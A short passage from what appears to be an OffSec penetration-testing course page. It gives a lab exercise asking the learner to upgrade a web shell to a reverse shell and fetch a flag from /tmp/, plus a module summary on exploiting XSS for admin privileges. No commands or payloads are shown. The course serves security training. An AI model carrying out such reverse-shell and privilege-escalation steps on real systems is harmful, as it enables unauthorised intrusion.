Upgrade the web shell to a full reverse shell and obtain the flag located in **/tmp/**. Note: The WordPress instance might show slow responsiveness due to lack of internet connectivity, which is expected.

Answer

## 8.5. Wrapping Up

In this Module, we focused on the identification and enumeration of common web application vulnerabilities. We exploited vulnerabilities such as API misconfigurations and XSS.

We concluded the Module by leveraging an XSS vulnerability to gain administrative privileges on a vulnerable web application via a specially crafted HTTP request.

- © 2025  [OffSec](https://www.offsec.com)
|- [Privacy](https://www.offsec.com/legal-docs/#privacy-policy)
|- [Terms of service](https://www.offsec.com/legal-docs/#terms)

Previous Module

Vulnerability Scanning

Next Module

Common Web Application Attacks

# OffSec KAI

[](https://help.offsec.com/hc/en-us/articles/26587607952404-OffSec-KAI-FAQ)

![OffSec KAI](https://portal.offsec.com/assets/kai-logo-MHZsiyCg.svg)

OffSec KAI

Hello! I'm KAI, your dedicated AI assistant. How can I help you with "Introduction to Web Application Attacks"?